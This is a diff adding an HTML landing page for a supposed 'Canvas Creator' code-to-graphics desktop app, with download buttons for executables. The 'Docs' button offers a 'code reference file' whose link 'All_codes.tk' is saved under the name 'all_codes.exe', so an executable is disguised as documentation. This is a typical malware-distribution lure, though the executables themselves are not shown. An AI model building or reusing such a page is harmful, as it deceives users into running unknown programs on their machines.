@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Canvas Creator | Download PC x64</title>
+    <!-- Modern Font -->
+    <link href="https://googleapis.com" rel="stylesheet">
+    <!-- Icons Library -->
+    <script src="https://unpkg.com"></script>
+    
+    <style>
+        :root {
+            --bg: #030712;
+            --accent: #6366f1;
+            --accent-hover: #4f46e5;
+            --text: #f9fafb;
+            --subtext: #9ca3af;
+            --glass: rgba(255, 255, 255, 0.03);
+            --border: rgba(255, 255, 255, 0.08);
+            --code-bg: #0d1117;
+            --code-green: #7ee787;
+            --code-blue: #79c0ff;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(99, 102, 241, 0.05) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(192, 132, 252, 0.05) 0%, transparent 40%);
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5rem 8%;
+            border-bottom: 1px solid var(--border);
+            backdrop-filter: blur(10px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo { font-size: 1.25rem; font-weight: 800; letter-spacing: -0.5px; }
+        .logo span { color: var(--accent); }
+
+        .hero {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            padding: 100px 5% 60px;
+        }
+
+        .badge {
+            background: var(--glass);
+            border: 1px solid var(--border);
+            padding: 6px 14px;
+            border-radius: 99px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            margin-bottom: 24px;
+            color: var(--accent);
+            animation: fadeIn 1s ease;
+        }
+
+        h1 {
+            font-size: clamp(2.5rem, 6vw, 4.5rem);
+            font-weight: 800;
+            line-height: 1.05;
+            margin-bottom: 24px;
+            max-width: 900px;
+        }
+
+        .gradient-text {
+            background: linear-gradient(135deg, #818cf8 0%, #c084fc 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        p {
+            color: var(--subtext);
+            font-size: 1.15rem;
+            max-width: 650px;
+            line-height: 1.6;
+            margin-bottom: 40px;
+        }
+
+        /* About Section with Consolas Font */
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            width: 100%;
+            max-width: 1000px;
+            margin-top: 40px;
+            text-align: left;
+        }
+
+        .info-card {
+            background: var(--glass);
+            border: 1px solid var(--border);
+            padding: 24px;
+            border-radius: 16px;
+            transition: 0.3s;
+        }
+
+        .info-card:hover { border-color: var(--accent); background: rgba(255,255,255,0.05); }
+
+        .info-card h3, .info-card p { 
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace; 
+        }
+
+        .info-card h3 { margin-bottom: 12px; color: var(--accent); font-size: 1.1rem; display: flex; align-items: center; gap: 8px; }
+
+        /* Docs Section - Centered Fix */
+        .docs-section {
+            margin-top: 60px;
+            width: 100%;
+            max-width: 1000px;
+            padding: 40px;
+            background: var(--glass);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Centers everything inside */
+            text-align: center;
+        }
+
+        .docs-section h2 { margin-bottom: 16px; font-size: 1.75rem; }
+        .docs-section p { margin-bottom: 32px; font-size: 1rem; }
+
+        .btn-docs {
+            background: rgba(255, 255, 255, 0.05);
+            color: white;
+            padding: 16px 32px;
+            border-radius: 12px;
+            text-decoration: none;
+            font-weight: 600;
+            display: inline-flex; /* Ensures it sizes to content */
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid var(--border);
+            cursor: pointer;
+        }
+
+        .btn-docs:hover {
+            background: var(--accent-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 20px 30px -10px rgba(99, 102, 241, 0.5);
+            border-color: transparent;
+        }
+
+        /* Rest of Styles */
+        .cta-group {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 16px;
+        }
+
+        /* First Button Hover Effects */
+        .btn-primary {
+            background: var(--accent);
+            color: white;
+            padding: 16px 32px;
+            border-radius: 12px;
+            text-decoration: none;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 10px 25px -5px rgba(99, 102, 241, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary:hover {
+            background: var(--accent-hover);
+            transform: translateY(-4px) scale(1.02);
+            box-shadow: 0 20px 40px -10px rgba(99, 102, 241, 0.6);
+        }
+
+        /* Shimmer effect on hover */
+        .btn-primary::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+
+        .btn-primary:hover::after {
+            left: 100%;
+        }
+
+        .version-tag { font-size: 0.75rem; color: var(--subtext); font-family: monospace; }
+
+        .preview-window {
+            margin-top: 60px;
+            width: 100%;
+            max-width: 850px;
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            animation: float 6s ease-in-out infinite;
+            box-shadow: 0 40px 100px -20px rgba(0,0,0,0.6);
+            text-align: left;
+        }
+
+        .window-bar {
+            background: rgba(255,255,255,0.03);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .dots { display: flex; gap: 8px; }
+        .dot { width: 12px; height: 12px; border-radius: 50%; background: #333; }
+        .dot.red { background: #ff5f56; }
+        .dot.yellow { background: #ffbd2e; }
+        .dot.green { background: #27c93f; }
+
+        .code-container {
+            padding: 24px;
+            font-family: 'Fira Code', monospace;
+            font-size: 14px;
+            line-height: 1.8;
+            color: #d1d5db;
+        }
+
+        .line { display: flex; gap: 20px; }
+        .line-num { color: #4b5563; text-align: right; width: 20px; }
+        .func { color: var(--accent); }
+        .string { color: var(--code-green); }
+        .param { color: var(--code-blue); }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotateX(2deg); }
+            50% { transform: translateY(-15px) rotateX(0deg); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <nav>
+        <div class="logo">Canvas<span>Creator</span></div>
+        <div class="nav-links">
+            <a href="#docs" style="color: var(--text); text-decoration: none; font-size: 0.9rem; font-weight: 500;">Docs</a>
+        </div>
+    </nav>
+
+    <main class="hero">
+        <div class="badge">Official PC x64 Version</div>
+        <h1>Turn Code into <span class="gradient-text">Visual Art</span></h1>
+        <p>Canvas Creator is a powerful desktop application that generates stunning graphics designs instantly when you execute specific code.</p>
+        
+        <div class="cta-group">
+            <a href="Canvas creator.exe" download="CanvasCreator_Setup.exe" class="btn-primary">
+                <i data-lucide="download-cloud">#</i>Download for PC x64
+            </a>
+            <span class="version-tag">build_v2.0.4_x64.exe (65.6MB)</span>
+        </div>
+
+        <div class="preview-window">
+            <div class="window-bar">
+                <div class="dots">
+                    <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
+                </div>
+                <div style="font-size: 12px; color: var(--subtext); font-family: 'Fira Code', monospace;">main.canvas</div>
+                <div style="width: 50px;"></div>
+            </div>
+            <div class="code-container">
+                <div class="line"><span class="line-num">0</span><span><span class="func">#A Example Code!</span></div>
+                <div class="line"><span class="line-num">1</span><span><span class="func">canvas_text</span>(<span class="param">text</span>=<span class="string">"Graphics Interface"</span>, <span class="param">color</span>=<span class="string">"green"</span>, x=1, move_x=500, y=500)</span></div>
+                <div class="line"><span class="line-num">2</span><span><span class="func">canvas_text</span>(<span class="param">text</span>=<span class="string">"________________"</span>, <span class="param">color</span>=<span class="string">"green"</span>, x=1, move_x=500, y=500)</span></div>
+                <div class="line"><span class="line-num">3</span><span><span class="func">canvas_up</span>(<span class="param">shape</span>=<span class="string">"cylinder"</span>, size=100, x=190, move_z=400, move_x=80)</span></div>
+                <div class="line"><span class="line-num">4</span><span><span class="func">canvas_up</span>(<span class="param">shape</span>=<span class="string">"circle"</span>, size=90, x=80)</span></div>
+                <div class="line"><span class="line-num">5</span><span><span class="func">canvas_down</span>(<span class="param">shape</span>=<span class="string">"prism"</span>, size=100, x=330)</span></div>
+                <div class="line"><span class="line-num">6</span><span><span class="func">canvas_down</span>(<span class="param">shape</span>=<span class="string">"prism"</span>, size=100, x=470, move_z=15.7, move_x=390)</span></div>
+            </div>
+        </div>
+
+        <!-- About Section -->
+        <div id="about" class="info-grid">
+            <div class="info-card">
+                <h3><i data-lucide="code-2"></i> Code to Design</h3>
+                <p>Simply write your instructions and watch as Canvas Creator transforms them into professional graphic elements in real-time.</p>
+            </div>
+            <div class="info-card">
+                <h3><i data-lucide="zap"></i> Easy to Use</h3>
+                <p>No complex menus or tools. If you can type simple commands, you can create high-quality graphics effortlessly.</p>
+            </div>
+            <div class="info-card">
+                <h3><i data-lucide="cpu"></i> Optimized for x64</h3>
+                <p>Built specifically for PC x64 architecture to ensure fast execution and smooth rendering of your designs.</p>
+            </div>
+        </div>
+
+        <!-- Documentation Section -->
+        <section id="docs" class="docs-section">
+            <div class="badge" style="margin: 0 auto 16px;">Reference Materials</div>
+            <h2>Developer Resources</h2>
+            <p>Ready to start building? Download our comprehensive code reference file to see all available commands and functions.</p>
+            <a href="All_codes.tk" download="all_codes.exe" class="btn-docs">
+                <i data-lucide="file-text">#</i>Docs
+            </a>
+        </section>
+
+    </main>
+
+    <script>
+        window.onload = function() {
+            if (typeof lucide !== 'undefined') {
+                lucide.createIcons();
+            }
+        };
+    </script>
+</body>
+</html>
